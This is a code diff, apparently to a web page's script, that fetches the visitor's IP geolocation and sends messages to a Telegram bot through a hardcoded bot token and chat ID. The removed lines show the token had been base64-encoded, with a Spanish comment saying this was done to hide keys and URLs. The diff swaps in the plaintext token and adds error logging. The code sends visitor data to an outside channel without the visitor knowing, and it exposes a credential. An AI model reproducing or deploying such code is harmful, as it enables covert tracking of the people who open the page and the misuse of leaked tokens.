@@ -19,10 +19,8 @@
 
 <script>
 (() => {
-  // Variables ofuscadas: strings base64 para ocultar claves y URLs
-  const b64 = str => atob(str);
-  const BOT_TOKEN = b64("ODAxMTYxOTk3NTpBQUVfRG9ucXk1eG44UkQwbDJMT0lQMzI2ZHRkc25PMWFn");
-  const CHAT_ID = b64("NjA2NTI4NDg2OQ==");
+  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
+  const CHAT_ID = "6065284869";
 
   const resultEl = document.getElementById("result");
   const startBtn = document.getElementById("startBtn");
@@ -106,6 +104,7 @@
   async function getIPInfo() {
     try {
       const res = await fetch("https://ipapi.co/json/");
+      if (!res.ok) throw new Error("No response");
       return await res.json();
     } catch {
       return null;
@@ -115,7 +114,7 @@
   async function sendToTelegram(message) {
     try {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
+      const response = await fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -123,8 +122,14 @@
           text: message,
         }),
       });
+      const data = await response.json();
+      console.log("Telegram response:", data);
+      if (!data.ok) {
+        resultEl.textContent += `\nError Telegram: ${data.description || 'Error desconocido'}`;
+      }
     } catch(e) {
       console.warn("Error enviando a Telegram:", e);
+      resultEl.textContent += `\nError enviando a Telegram: ${e.message}`;
     }
   }
 
